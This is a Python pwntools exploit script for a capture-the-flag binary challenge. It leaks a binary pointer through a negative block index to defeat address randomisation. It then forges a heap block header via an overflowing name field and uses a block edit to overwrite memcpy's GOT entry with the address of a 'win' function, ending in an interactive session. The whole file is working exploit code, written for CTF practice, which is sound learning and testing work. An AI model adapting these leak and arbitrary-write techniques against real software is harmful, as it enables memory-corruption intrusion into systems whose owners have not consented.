import argparse
import struct

from pwn import *



PATH = '../challenge/handout/challenge'

#context(arch='amd64', os='linux')
elf = ELF(PATH)
context.binary = elf

# Debugger
# gdb_commands = ''
# #gdb_commands = 'b read_number\n' + gdb_commands
# # gdb_commands = 'b delete_block\n' + gdb_commands
# #gdb_commands = 'b edit_block\n' + gdb_commands
# #gdb_commands = 'b change_name\n' + gdb_commands
# gdb_commands += 'c\n'
# r = gdb.debug(PATH, gdbscript=gdb_commands, level='debug')

# local
r = process(PATH, level='debug')

# remote
#parser = argparse.ArgumentParser()
#parser.add_argument("address", default="127.0.0.1:8001",
#                   nargs="?", help="Address of challenge")
#args = parser.parse_args()
#HOST, PORT = args.address.split(':')
#r = remote(HOST, int(PORT))


def get_leak(r, offset):

    response = r.recvuntil(b'input? ')
    r.send(b'0131')

    # new block
    r.recvuntil(b'size: ')
    r.sendline(b'1')  # doesn't matter
    r.recvuntil(b'bytes: ')
    r.send(b'a')
    # delete block
    r.recvuntil(b'delete: ')
    r.sendline(f'{offset}'.encode())  # This is the offset to use
    # block size
    r.recvuntil(b'for: ')
    r.sendline(b'20')  # bad size, should reuse offset
    # leaked values are returned after this send
    # delete block
    returned = r.recvuntil(b'delete: ')
    r.sendline(b'0')  # This is the offset to use

    r.recvuntil(b'\n')

    #print(hexdump(returned))
    # Several addresses leaked, picking the one I want
    target_line = returned.split(b'\n')[2]
    leak_addr = target_line.split(b' ')[1]
    leak_value = int(leak_addr, 16)
    # print(f'DBG: {hex(leak_value)=}')

    return leak_value


def do_write(r, what, where):
    # new block
    response = r.recvuntil(b'input? ')
    r.send(b'0\00\00\00')

    r.recvuntil(b'size: ')
    r.sendline(b'1')  # doesn't matter
    r.recvuntil(b'bytes: ')
    r.send(b'a')

    response = r.recvuntil(b'input? ')
    # Change name, edit block
    r.send(b'54\00\00')

    # Change name
    r.recvuntil(b'newline): ')
    # Find offsets
    # pat = cyclic(255)
    # r.sendline(pat)

    # Craft block
    # header_offset = 224 # maybe 228?
    header_offset = 208
    payload = b'A' * header_offset
    header = 0xdeadbeef
    footer = 0xbaadf00d
    size = 0x8
    print(f'{header:08x}, {size:x}, {where:016x}, {footer:08x}')

    payload += p64(header)
    payload += p64(0x8) # size
    payload += p64(where)
    payload += p64(footer)
    payload += b'B' * (252 - len(payload))
    payload += b'\n'
    r.send(payload)

    # edit block
    r.recvuntil(b'edit: ')
    r.send(b'19\00')  # Bad val to skip check
    r.recvuntil(b'bytes: ')
    r.send(p64(what))


# Leak an address as a struct size * offset from the block stack
leak_index = -10
print(f'\n\n[*] leaking {leak_index} for pointer to binary')
leak_val = get_leak(r, leak_index)

#offset = 0x690
section = elf.get_section_by_name('.gnu.version')
offset = section.header.sh_offset

base = leak_val - offset
print(f'[*] Using leak ptr @ {hex(offset)=}, base is {hex(base)}')

# do overwrite
win_offset = elf.symbols['win']
win_addr = base + win_offset
target_got_offset = elf.got['memcpy']
print(f'got[memcpy]: {target_got_offset:016x}')
memcpy_addr =  base + target_got_offset
print(f'[!] Trying to write {win_addr:016x} @ {memcpy_addr:016x}')
do_write(r, win_addr, memcpy_addr)

# trigger memcpy via print_block_content
response = r.recvuntil(b'input? ')
r.send(b'2\00\00\00')
r.recvuntil(b'print: ')
r.sendline(b'0\n')

r.interactive()
